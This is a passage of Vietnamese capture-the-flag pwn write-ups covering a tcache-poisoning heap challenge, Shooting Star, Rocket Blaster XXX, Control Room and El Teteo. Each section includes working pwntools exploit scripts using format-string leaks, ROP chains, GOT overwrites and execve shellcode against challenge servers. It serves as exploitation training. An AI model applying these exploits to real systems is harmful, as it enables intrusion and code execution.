cho  ta  nhập 1 size <224 ,nhập idx , và check xem idx  đó có tồn tại chưa hoặc có OOB không , tiếp theo nữa là malloc với size mà ta nhập vào , tiếp theo nữa là read dữ liệu vào chunk đó 
![image](https://hackmd.io/_uploads/BkNyWFof1e.png)

option2 (```edit_toxin```) : 

cho ta chỉnh sửa chunk đó với idx nhập vào
![image](https://hackmd.io/_uploads/H1xkGYsMJg.png)


option3 (```drink_toxin```) :

cho nhập 1 idx và free với idx đó luôn , ở đây ta chỉ được free() 1 lần duy nhất 
![image](https://hackmd.io/_uploads/BymZGYoGkl.png)


option4 (```search_toxin```) : 


xảy ra bug fmt ở đây
![image](https://hackmd.io/_uploads/Hy_4fFjfkx.png)


- Ý tưởng : 

vì có bug fmt ở đây nên trước hết là ta sẽ leak hết các cái địa chỉ để khi cần có thể sử dụng (libc,exe,stack)  

tiếp theo nữa là bug UAF , bài này sử dụng libc 2.27 -> có tcache , giới hạn chỉ được free() 1 lần và chunk tạo tối đa là 3 

ta cũng cần biết là khi free() thì nó sẽ check  size đầu tiên , nếu size lớn hơn 0x410 thì nó sẽ vào unsorted bin , tuy nhiên ở bài này giới hạn  size nên ta không thể làm  điều đó

1 điều nữa là tcache sẽ chứa tối đa 7 chunk cùng 1 size -> nếu free() chunk thứ 8 với size là 0x90 thì nó sẽ vào UBIN , tuy nhiên nói cho vui chứ không liên quan đến bài này 

tiếp tục ý tưởng ban đầu , sau khi leak các địa chỉ xong thì ta thử malloc() 1 chunk và free() , lúc này vì có bug UAF nên ta có thể sử dụng option edit để edit fd của nó trỏ đến 1 thằng nào đó(GOT ,hook) , lúc này ta đã có thể ghi bất cứ thứ gì vào , và tất nhiên đó là one_gadget hoặc system của ta 

- ở đây ta lựa chọn thằng RIP để ghi one_gadget vào luôn , còn không thì ta chọn thằng malloc_hook cũng dc 


script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./toxin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

p = process()
#p = remote('94.237.62.166',40647)
gdb.attach(p,gdbscript='''
            b*add_toxin+232
            b*add_toxin+320
            b*edit_toxin+197
           b*drink_toxin+180
             b*search_toxin+213
          ''')
def add(size,idx,content):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'length: ',size)
    p.sendlineafter(b'index: ',idx)
    p.sendafter(b'formula: ',content)

def edit(idx,content):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'index: ',idx)
    p.sendafter(b'formula: ',content)

def free(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'index: ',idx)
def search_fsb(fsb):
    p.sendlineafter(b'> ',b'4')
    p.sendafter(b'term: ',fsb)


########## leak libc ##########
search_fsb(b'%13$p')

leak = int(p.recvuntil(b' ')[:-1],16)

libc.address = leak - 0x21b97
log.info(f"libc: {hex(libc.address)}")

#########leak PIE ##########
#search_fsb(b'%9$p')
#leak_PIE = int(p.recvuntil(b' ')[:-1],16)

#exe.address = leak_PIE - 0x1284
#log.info(f"exe: {hex(exe.address)}")

##### leak Stack #######
search_fsb(b'%p')
leak_stack = int(p.recvuntil(b' ')[:-1],16)
log.info(f"leak_stack: {hex(leak_stack)}")
saved_RIP = leak_stack + 0xe
log.info(f"save RIP {hex(saved_RIP)}")


############# TCACHE POISON  ###################
input()
add(str(0x30),b'0','yoWTF')
free(b'0')
edit(b'0',p64(saved_RIP))
ONE_GADGET = 0x4f322
input()



p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'length: ',str(0x30))
p.sendlineafter(b'index: ',b'1')
p.sendafter(b'formula: ',b'nothing')


p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'length: ',str(0x30))
p.sendlineafter(b'index: ',b'2')
p.sendafter(b'formula: ',p64(libc.address + ONE_GADGET))

#input()
#search_fsb(b'%999$c')
#p.sendlineafter(b'> ',b'7')



p.interactive()

```

-------

36 . Shooting star (ret2plt , ret2csu)
------

1 bài ret2csu tuy nhiên có thể làm theo ret2plt 


dễ nên để script ở đây thôi 

script 

csu
```
#!/usr/bin/env python3

from pwn import *
from typing import List

context.binary = elf = ELF('shooting_star')
rop = ROP(elf)


def get_process():
    if len(sys.argv) == 1:
        return elf.process(), ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

    host, port = sys.argv[1].split(':')
    return remote(host, int(port)), ELF('libc6_2.27-3ubuntu1.4_amd64.so', checksec=False)


def send_rop_chain(p, rop_chain: List[int]):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', flat({72: rop_chain}))
    p.recvuntil(b'May your wish come true!\n')


def leak(p, leaked_function: str) -> int:
    send_rop_chain(p, [
        rop.rdi[0],
        1,
        rop.rsi[0],
        elf.got[leaked_function],
        0,
        elf.plt.write,
        elf.sym.main,
    ])

    leak = u64(p.recv(8))
    log.info(f'Leaked {leaked_function}() address: {hex(leak)}')
    return leak


def main():
    p, glibc = get_process()

    write_addr   = leak(p, 'write')
    read_addr    = leak(p, 'read')
    setvbuf_addr = leak(p, 'setvbuf')

    glibc.address = setvbuf_addr - glibc.sym.setvbuf
    log.success(f'Glibc base address: {hex(glibc.address)}')

    send_rop_chain(p, [
        rop.rdi[0],
        next(glibc.search(b'/bin/sh')),
        glibc.sym.system,
    ])

    p.interactive()


if __name__ == '__main__':
    main()
```


plt 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./shooting_star_patched',checksec=False)
libc = ELF('./libc.so.6')

#p = process()
p = remote('94.237.59.180',54137)

pop_rdi =0x00000000004012cb
pop_rsi_r15 =0x00000000004012c9
payload = b'a'*72
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(0x404018) + p64(0)
payload += p64(exe.sym.write)
payload += p64(exe.sym.main)
p.sendlineafter(b'> ',b'1')
p.sendafter(b'>> ',payload)
p.recvuntil(b'true!')
p.recvline()

leak = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(leak))
libc.address =leak - 0x110210
log.info(f'libc {hex(libc.address)}')
#gdb.attach(p,gdbscript='''
#           b*0x00000000004011EC
#           ''')
input()
payload2 = b'a'*72
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(libc.sym.system)
p.sendlineafter(b'> ',b'1')
p.sendafter(b'>> ',payload2)
p.interactive()
```

--------

37 . Rocket Blaster XXX(calling convention)
------

- 1 bài cần  biết về cách thức gọi 1 hàm trong kiến trúc 64 bit 

main: 

có BOF , và có luôn hàm win nên chỉ việc ret2win

![image](https://hackmd.io/_uploads/r1wtcKizkl.png)

win: 
nó sẽ check từng thằng nếu đúng thì in ra flag 

![image](https://hackmd.io/_uploads/r1bscFjf1g.png)


đối số lần lượt sẽ là (RDI,RSI,RDX)

![image](https://hackmd.io/_uploads/Hkr69Ksz1g.png)


script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rocket_blaster_xxx_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
p = remote('94.237.62.117',43328)
#gdb.attach(p,gdbscript='''
#           b*0x00000000004014C6
#           ''')
input()

pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b

payload = b'a'*0x28
payload += p64(pop_rdi)
payload += p64(0xDEADBEEF)
payload += p64(pop_rsi)
payload += p64(0xDEADBABE)
payload += p64(pop_rdx)
payload += p64(0xDEAD1337)
payload += p64(pop_rdi+1)
payload += p64(exe.sym.fill_ammo)
p.send(payload)

p.interactive()
```


--------


38 . Control Room (WRITE-WHAT-WHERE)
--------

- 1 baì khá dài , cần rev rất nhiều :>>

- reverse : ta sẽ tiến hành phân tích từng hàm


```

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  char s[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setup();
  *(_DWORD *)s = 0;
  user_register();
  printf("\nAre you sure about your username choice? (y/n)");
  printf("\n> ");
  fgets(s, 4, stdin);
  s[strcspn(s, "\n")] = 0;
  v3 = s;
  if ( !strcmp(s, "y") )
  {
    v3 = 0LL;
    log_message(0LL, "User registered successfully.\n");
  }
  else
  {
    user_edit(s);
  }
  menu(v3);
  return 0;
}
```

log_message : 

hàm này có lẽ in cái role hiện  tại ra 

![image](https://hackmd.io/_uploads/SyswOR2G1l.png)


run  file thử thì role mặc định là ``` crew ``` , và ta cũng thấy từng role sẽ có các chức năng khác nhau , ta sẽ phải đổi role vì thằng crew này kh làm dc gì :)))

![image](https://hackmd.io/_uploads/SyH9dC3zkx.png)


ta thấy được là RAX phải = 0 (nghĩa là role của captain thì mới set role được)

![image](https://hackmd.io/_uploads/Skn2FR2zJl.png)


- quay lại hàm setup thì thấy thằng này 

nó sẽ malloc 1 vùng nhớ 0x110 , xong gán 2 vào đoạn +64 (2 là role của crew)

![image](https://hackmd.io/_uploads/BkvRqAnGye.png)


- user_register 

thằng này read 0x100 vào src , xong strncpy  từ src vào curr_user , ở đây ta thấy được nó xài mấy hàm nguy hiểm như strncpy  , strlen()  nên cần check kĩ xem có bug không , ở đây ta phải biết là ta chỉ có thể nhập được 255 byte vì trong read_input  nó sẽ gán byte null vào cuối mà thằng strlen() chỉ xét đến byte null nên độ dài sẽ là 255+1 = 256
![image](https://hackmd.io/_uploads/rJA01J6z1g.png)

![image](https://hackmd.io/_uploads/BJmNoChMye.png)

tiếp theo nữa là user_edit : 

hàm này cho ta edit username , nó chỉ chấp nhận với size >= size cũ , nên ta sẽ nhập full là 255 và malloc(n+1) có nghĩa là 256 =))  

ở đây ta thấy thằng memset này trông vô hại nhưng nó lại có hại :))) , nó sẽ memset cái thằng role của ta về 0 luôn vì 256 + 1 (1 word = 4 byte có nghĩa là memset thằng role về 0)
![image](https://hackmd.io/_uploads/B1Dje1pGJx.png)

check ở đây 


![image](https://hackmd.io/_uploads/B1nnWk6GJe.png)


![image](https://hackmd.io/_uploads/Bkezx1pMye.png)


- khi role thay đổi thành công thì ta sẽ  quay lại các hàm được  cấp role 



change_route : 

hàm  này sẽ nhập 1 giá trị gì đó xong chuyển nó vào bss ...

```
unsigned __int64 change_route()
{
  int i; // [rsp+Ch] [rbp-54h]
  __int64 v2[8]; // [rsp+10h] [rbp-50h] BYREF
  char s[2]; // [rsp+55h] [rbp-Bh] BYREF
  char v4; // [rsp+57h] [rbp-9h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v4 = 0;
  if ( *((_DWORD *)curr_user + 64) )
  {
    log_message(3u, "Only the captain is allowed to change the ship's route\n");
  }
  else
  {
    for ( i = 0; i <= 3; ++i )
    {
      printf("<===[ Coordinates [%d] ]===>\n", (unsigned int)(i + 1));
      printf("\tLatitude  : ");
      __isoc99_scanf("%ld", &v2[2 * i]);
      printf("\tLongitude : ");
      __isoc99_scanf("%ld", &v2[2 * i + 1]);
    }
    getchar();
    printf("\nDo you want to save the route? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      route = v2[0];
      qword_405168 = v2[1];
      qword_405170 = v2[2];
      qword_405178 = v2[3];
      qword_405180 = v2[4];
      qword_405188 = v2[5];
      qword_405190 = v2[6];
      qword_405198 = v2[7];
      log_message(0, "The route has been successfully updated!\n");
    }
    else
    {
      log_message(1u, "Operation cancelled");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```


- view_route : 

thằng này sẽ in cái  vừa nhập ở option trước ra 

![image](https://hackmd.io/_uploads/SJ-SX1aM1e.png)


change_role : 

thằng này  sẽ làm nhiệm vụ chuyển role cho  ta

![image](https://hackmd.io/_uploads/BJPqXJpfJe.png)


ở role technical  ta có option ```configure_engine``` : 

hàm này cho phép nhập 2 giá trị , gán giá trị này cho địa chỉ kia (write_what_where)

```
unsigned __int64 configure_engine()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  int num; // [rsp+Ch] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-18h] BYREF
  char s[2]; // [rsp+25h] [rbp-Bh] BYREF
  char v7; // [rsp+27h] [rbp-9h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v7 = 0;
  if ( *((_DWORD *)curr_user + 64) == 1 )
  {
    printf("\nEngine number [0-%d]: ", 3LL);
    num = read_num();
    if ( num <= 3 )
    {
      printf("Engine [%d]: \n", (unsigned int)num);
      printf("\tThrust: ");
      __isoc99_scanf("%ld", &v4);
      printf("\tMixture ratio: ");
      __isoc99_scanf("%ld", &v5);
    }
    getchar();
    printf("\nDo you want to save the configuration? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      v0 = (_QWORD *)((char *)&engines + 16 * num);
      v1 = v5;
      *v0 = v4;
      v0[1] = v1;
      log_message(0, "Engine configuration updated successfully!\n");
    }
    else
    {
      log_message(1u, "Engine configuration cancelled.\n");
    }
  }
  else
  {
    log_message(3u, "Only technicians are allowed to configure the engines");
  }
  return __readfsqword(0x28u) ^ v8;
}
```


vậy  bài này sẽ là 1 bài write_what_where , ta sẽ nghĩ đến ghi system thay cho thằng got nào đó sử dụng ít đối số để dễ khai thác

- vậy trước tiên ta phải leak libc trước , ở đây sẽ có 2 cách để leak , cách thứ nhất là dùng hàm change_route 


hàm này dùng scanf để ghi  vào bss , sử dụng định  dạng %ld  , vậy nếu ta nhập '-' thì nó sẽ không ghi gì vào stack mà giá  trị ở stack cũng  không dc khởi tạo -> nó lưu giá  trị đó  vào bss nếu may mắn thì ta sẽ có luôn địa chỉ libc bằng cách dùng option4 (view_route) để in  ra


![image](https://hackmd.io/_uploads/rJyl8kaM1e.png)

cách thứ hai để leak là overwrite got của exit thành user_edit  , và overwrite free thành printf 

lúc này ta có thể truyền đối số như đang tận dụng bug fmt 
![image](https://hackmd.io/_uploads/rkCvLl6Mkx.png)

cách 2 tham khảo ở đây : https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/

mình  sẽ làm theo cách 1 : 

đoạn này sẽ leak thành công libc cho ta

```
for i in range(8):
    p.sendlineafter(b':',b'-')

p.sendlineafter(b'> ',b'y')
p.sendlineafter(b':',b'4')
p.recvuntil(b'[1]')
p.recvlines(2)
p.recvuntil(b'Longitude : ')
leak = int(p.recvline()[:-1])
libc.address = leak -0x43654
print(hex(libc.address))
log.success("leak libc thanh cong")
```

leak xong thì ghi got của 1 hàm nào đó lấy ít đối số , vd như atoi()  

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./control_room_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#p = process()
p = remote('94.237.58.94',49443)

p.sendlineafter(b'username: ',b'a'*256)
#p.sendlineafter(b'> ',b'n')

p.sendlineafter(b'size: ',b'256')
p.sendlineafter(b'username: ',b'abcdef')



log.success("buoc 1 thanh cong")

log.info("buoc 2 : leak libc")
p.sendlineafter(b':',b'3')
for i in range(8):
    p.sendlineafter(b':',b'-')

p.sendlineafter(b'> ',b'y')
p.sendlineafter(b':',b'4')
p.recvuntil(b'[1]')
p.recvlines(2)
p.recvuntil(b'Longitude : ')
leak = int(p.recvline()[:-1])
libc.address = leak -0x43654
print(hex(libc.address))
log.success("leak libc thanh cong")

offset = (exe.got.atoi-exe.sym.engines) // 16

print(type(libc.sym.system))
print(libc.sym.system)
p.sendlineafter(b'-5]: ',b'5')
p.sendlineafter(b'role: ',b'1')

p.sendlineafter(b']: ',b'1')
p.sendlineafter(b']: ',str(offset))
p.sendlineafter(b'Thrust: ',str(libc.sym.system))
p.sendlineafter(b'ratio: ',b'-')
p.sendlineafter(b'> ',b'y')
log.success("over got thanh cong")
p.sendlineafter(b']: ',b'sh')

p.interactive()
```

--------------

39 . El Teteo
---------

checksec : 

![image](https://hackmd.io/_uploads/SJIqHj671x.png)

reverse : 

```
  printf(&DAT_00102058,local_a8[iVar32 % 6],puVar31,puVar30,puVar29,puVar28,puVar27,puVar26,puVar2 5,
         puVar24,puVar23,puVar22,puVar21,puVar20,puVar19,puVar18,puVar17,puVar16,puVar15,puVar14,
         puVar13,puVar12,puVar11,puVar10,puVar9,puVar8,puVar7,puVar6,puVar5,puVar4,puVar3,puVar2,
         puVar1);
  printstr("[!] I will do whatever you want, nice or naughty..\n\n> ");
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  read(0,&local_68,0x1f);
  (*(code *)&local_68)();
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

ta thấy nó read vào 0x1f bytes ở local68 

![image](https://hackmd.io/_uploads/BJekyBsp7kl.png)

check trong ghidra thì ta thấy được nó ở vị trí stack-0x68 -> sẽ có BOF 

- tiếp theo là nó thực thi con trỏ hàm với đối số mà ta nhập vào -> bài này sẽ dùng shellcode bình thường vì dư khá nhiều byte () , à mà không  cần thiết vì nó sẽ thực thi cái ta nhập vào luôn 

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./el_teteo_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('83.136.251.254',33522)

sc = asm('''
         push rax
         mov rax,29400045130965551
         push rax
         mov rdi,rsp
         xor rsi,rsi
         xor rdx,rdx
         mov rax,0x3b
         syscall

         ''',arch='amd64')
p.send(sc)

p.interactive()
```

![image](https://hackmd.io/_uploads/Bk6ILspXJg.png)
